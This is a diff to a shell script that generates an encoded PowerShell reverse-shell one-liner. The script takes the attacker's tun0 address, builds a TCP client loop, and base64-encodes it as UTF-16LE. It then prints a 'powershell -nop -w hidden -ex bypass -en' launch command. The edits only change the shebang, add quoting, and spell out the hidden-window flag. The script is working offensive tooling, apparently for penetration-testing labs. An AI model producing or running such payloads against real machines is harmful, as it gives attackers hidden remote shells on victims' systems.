@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 echo "  [i] This script generates a powershell reverse shell one-liner based on the current ip and port of your listener."
 
 ip=$(ip a | grep -A 2 tun0: | grep inet | cut -d ' ' -f 6 | cut -d '/' -f 1)
@@ -37,13 +37,13 @@ while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){\
 \$client.Close();\
 "
 echo "  [+] Command to encode:"
-echo $commandString
+echo "$commandString"
 
 echo
-base64Command=$(echo -n $commandString | iconv -t utf-16le | base64 -w 0)
+base64Command=$(echo -n "$commandString" | iconv -t utf-16le | base64 -w 0)
 echo "  [+] Converted to UTF-16le Base64 (the format powershell needs):"
-echo $base64Command
+echo "$base64Command"
 
 echo
 echo "  [+] Here you go. Use wisely."
-echo "powershell -nop -w h -ex bypass -en $base64Command"
+echo "powershell -nop -w hidden -ex bypass -en $base64Command"
